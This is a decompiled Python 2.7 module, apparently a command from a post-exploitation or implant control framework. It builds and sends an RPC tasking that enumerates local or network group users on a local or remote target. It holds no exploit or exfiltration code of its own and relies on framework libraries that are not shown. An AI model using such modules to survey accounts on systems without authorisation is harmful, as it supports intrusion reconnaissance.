# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: Mcl_Cmd_Users_Tasking.py
USERS_GROUP_TYPE_LOCAL = 1
USERS_GROUP_TYPE_NETWORK = 2

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.users', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.users.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.survey.cmd.users.Params()
    if lpParams['type'] == USERS_GROUP_TYPE_LOCAL:
        tgtParams.groupType = mca.survey.cmd.users.PARAMS_GROUP_TYPE_LOCAL
    elif lpParams['type'] == USERS_GROUP_TYPE_NETWORK:
        tgtParams.groupType = mca.survey.cmd.users.PARAMS_GROUP_TYPE_NETWORK
    if lpParams['groupName'] != None:
        tgtParams.group = lpParams['groupName']
    if lpParams['serverName'] != None:
        tgtParams.target = lpParams['serverName']
    taskXml = mcl.tasking.Tasking()
    if tgtParams.target != None and len(tgtParams.target) > 0:
        taskXml.SetTargetRemote(tgtParams.target)
    else:
        taskXml.SetTargetLocal()
    if tgtParams.group != None and len(tgtParams.group) > 0:
        taskXml.AddSearchMask(tgtParams.group)
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    rpc = mca.survey.cmd.users.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.survey.cmd.users.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)